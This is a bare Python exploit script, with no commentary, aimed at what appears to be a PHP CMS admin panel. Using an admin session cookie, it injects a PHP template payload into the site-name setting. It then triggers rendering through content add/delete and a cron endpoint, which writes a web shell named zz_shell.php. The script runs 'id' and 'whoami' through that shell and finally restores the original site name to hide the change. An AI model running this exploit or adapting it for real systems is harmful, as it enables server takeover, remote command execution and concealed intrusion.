import sys, re, requests

b = sys.argv[1].rstrip("/")
ck = sys.argv[2]
e = sys.argv[3] if len(sys.argv) > 3 else "admin.php"
catid, mod = "200", "news"
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
s.headers["Cookie"] = ck
a = b + "/" + e


def p(label, r, n=100):
    print("%-14s HTTP %-4s %s" % (label, r.status_code, r.text[:n].replace("\n", " ")), flush=True)
    return r


if p("entry", s.get(a, allow_redirects=False)).status_code == 404:
    print("admin entry not found: /%s" % e)
    sys.exit(1)

r = p("session", s.get(a + "?s=cms&c=site_config&m=index", allow_redirects=False))
if r.status_code != 200:
    print("invalid session: cookie expired or User-Agent mismatch")
    sys.exit(1)

pay = "ZZSITE_{php echo file_put_contents($_SERVER['DOCUMENT_ROOT'].'/zz_shell.php',chr(60).'?php echo '.chr(96).'$_GET[0]'.chr(96).';');}"
d = {"data[SITE_NAME]": pay, "data[SITE_LANGUAGE]": "zh-cn", "data[SITE_TEMPLATE]": "default",
     "data[SITE_THEME]": "default", "data[SITE_CLOSE]": "0", "data[SITE_INDEX_HTML]": "0",
     "data[SITE_TIMEZONE]": "8"}
h = s.get(a + "?s=cms&c=site_config&m=index").text
m = re.search(r'name="data\[SITE_NAME\]"[^>]*?value="([^"]*)"', h)
orig = m.group(1) if m else ""
if '"code":1' not in p("write-site", s.post(a + "?s=cms&c=site_config&m=index", data=d,
                                            allow_redirects=False)).text:
    print("write failed: invalid session")
    sys.exit(1)

p("enable-notice", s.post(a + "?s=member&c=setting_notice&m=add",
                          data={"data[module_content_delete][email]": "1"}))

au = '%s&c=home&m=add&catid=%s' % (mod, catid)
h = s.get(a + "?s=" + au).text
d = dict(re.findall(r'name="([^"]+)"[^>]*?value="([^"]*)"', h))
for k, body in re.findall(r'name="([^"]+)"(.*?)</select>', h, re.S):
    m = re.search(r'<option[^>]*selected[^>]*value="([^"]*)"', body)
    d.setdefault(k, m.group(1) if m else "")
d.update({"data[title]": "zztmp", "data[content]": "zz",
          "catid": catid, "data[catid]": catid, "id": "0", "module": mod})
r = p("content-add", s.post(a + "?s=" + au, data=d))
m = re.search(r'"id":(\d+)', r.text)
cid = m.group(1) if m else "0"
try:
    p("content-del", s.post(a + "?s=%s&c=home&m=del&catid=%s" % (mod, catid),
                             data=[("ids[]", cid)], timeout=60))
except requests.exceptions.ReadTimeout:
    print("content-del timeout", flush=True)

r = p("cron-run", s.get(b + "/index.php?s=api&c=run&m=index&num=20&is_cdn=1"))
if "Run Ok" in r.text:
    print("Run Ok = 0 tasks")
r = p("shell", s.get(b + "/zz_shell.php?0=id"))
if r.text.strip() == "":
    p("shell", s.get(b + "/zz_shell.php?0=whoami"))

if orig:
    p("restore-name", s.post(a + "?s=cms&c=site_config&m=index",
                             data={"data[SITE_NAME]": orig}, allow_redirects=False))
print("\ndone")
